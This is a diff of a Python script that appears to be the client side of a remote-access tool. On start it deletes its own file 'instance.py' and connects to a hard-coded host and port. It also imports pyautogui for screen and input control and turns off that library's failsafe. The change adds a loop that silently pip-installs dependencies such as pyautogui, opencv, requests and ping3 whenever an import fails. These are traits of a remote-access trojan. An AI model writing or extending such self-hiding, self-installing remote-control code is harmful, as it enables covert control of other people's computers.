@@ -1,19 +1,32 @@
-BUFFER_SIZE, start_time  = '',''
 host_ip, host_port = '192.168.1.2', 65499
 
-def run(img_dict, instance_token):
 
+start_time  = ''
+def run(img_dict, instance_token):
     from os import remove
     remove('instance.py')
-    global BUFFER_SIZE, start_time
+    global start_time
     import socket
     from time import time, sleep
-    import pyautogui
     from random import choice, randrange
     from threading import Thread
     from platform import system
-    from PIL import Image
     from os import system as system_caller
+    while True:
+        try:
+            import pyautogui
+            from PIL import Image
+            from ping3 import ping
+            from requests import get
+            break
+        except:
+            import pip
+            pip.main(['install', 'pyautogui'])
+            pip.main(['install', 'opencv_python'])
+            pip.main(['install', 'pillow'])
+            pip.main(['install', 'requests'])
+            pip.main(['install', 'ping3'])
+            del pip
 
     def force_connect_server():
         global host_ip, host_port
@@ -224,7 +237,6 @@ def run(img_dict, instance_token):
 
 
     pyautogui.FAILSAFE = False
-    BUFFER_SIZE = 1024 * 100
     os_type = system()
     start_time = time()
     link = ''
